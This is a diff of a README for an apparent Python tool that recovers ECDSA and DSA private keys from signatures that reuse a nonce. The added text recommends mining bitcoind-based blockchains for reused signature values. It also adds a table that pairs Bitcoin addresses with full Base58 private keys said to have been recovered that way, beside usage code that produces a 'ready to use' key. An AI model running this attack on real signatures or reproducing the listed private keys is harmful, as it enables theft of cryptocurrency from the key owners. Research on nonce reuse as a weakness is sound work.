@@ -4,7 +4,7 @@ Pperform ECDSA and DSA Nonce Reuse private key recovery attacks
 ###### This is kind of an improved version of the DSA only variant from https://github.com/tintinweb/DSAregenK
 
 
-Let's recover the private-key for two signatures sharing the same `nonce k`. Note how chosing the same `nonce k` results in both signatures having an identical signature value `r`.
+Let's recover the private-key for two signatures sharing the same `nonce k`. Note how chosing the same `nonce k` results in both signatures having an identical signature value `r`. To find good candidates for an ECDSA nonce reuse check for signatures sharing the same `r`, `pubkey` on `curve` for different messages (or hashes). E.g. blockchain projects based off `bitcoind` are usually good sources of ECDSA signature material.
 
 * **sampleA** (**r**, *sA, hashA*, pubkey, curve)
 * **sampleB** (**r**, *sB, hashB*, pubkey, curve)
@@ -14,9 +14,20 @@ sampleA = EcDsaSignature(r, sA, hashA, pubkey, curve)
 sampleB = EcDsaSignature(r, sB, hashB, pubkey, curve) # same privkey as sampleA, identical r due to nonce reuse k.
 
 # recover the private key
-sampleA.recover_nonce_reuse(sampleB) # populates sampleA with the recovered private key ready for use
-print sampleA.privkey
+sampleA.recover_nonce_reuse(sampleB)  # populates sampleA with the recovered private key ready for use
+print sampleA.privkey 
 ```
+
+### Some ECDSA Private Keys recovered from the Bitcoin Blockchain
+
+
+
+| BTC Address  | Base58 Privkey |   r| 
+| ------------- | ------------- | -------------|
+| 1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962 |5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT | 113563387324078878147267949860139475116142082788494055785668341901521289846519 |  
+| 1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962 | 5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT | 18380471981355278106073484610981598768079378179376623360720556873242139981984|
+|1C8x2hqqgE2b3TZPQcFgas73xYWNh6TK9W|5JKkG6KXLCCPXN9m29ype6My7eR4AnCLaHKYrLvn6d3nd8BLjjw| 19682383735358733565748628081379024202682929012377912380310432818686294127462|
+|1A8TY7dxURcsRtPBs7fP6bDVzAgpgP4962|5JsYaHVGCUzuXaQ5VkaA21VFPJFuArRWfSB77sqzWkWuTMMjXsT|6828441658514710620715231245132541628903431519484374098968817647395811175535|
 
 ### Example
 
@@ -40,25 +51,23 @@ sampleA = EcDsaSignature((379130099915950348967791836193116186659457539634752408
                              765305792208265383632692154455217324493836948492122104105982244897804317926).decode(
                              "hex"),
                          pub)
-sampleB = EcDsaSignature((3791300999159503489677918361931161866594575396347524089635269728181147153565,
-                          34219161137924321997544914393542829576622483871868414202725846673961120333282),
+sampleB = EcDsaSignature((3791300999159503489677918361931161866594575396347524089635269728181147153565,   #r
+                          34219161137924321997544914393542829576622483871868414202725846673961120333282), #s'
                          bignum_to_hex(
                              23350593486085962838556474743103510803442242293209938584974526279226240784097).decode(
                              "hex"),
                          pub)
                          
 # key not yet recovered
-assert (sampleA.x is None)              # privatekey is not available, attempt to recover it
+assert (sampleA.x is None)     
 ```
 
 recover the private key for **sampleA**
 ```python
 # attempt to recover key - this updated object sampleA
-logger.debug("%r - recovering private-key from nonce reuse ..." % sampleA)
 sampleA.recover_nonce_reuse(sampleB)    # recover privatekey shared with sampleB
 assert (sampleA.x is not None)          # assert privkey recovery succeeded. This gives us a ready to use ECDSA privkey object
 assert sampleA.privkey
-logger.debug("%r - Private key recovered! \n%s" % (sampleA, sampleA.export_key()))
 ```
 
 #### output
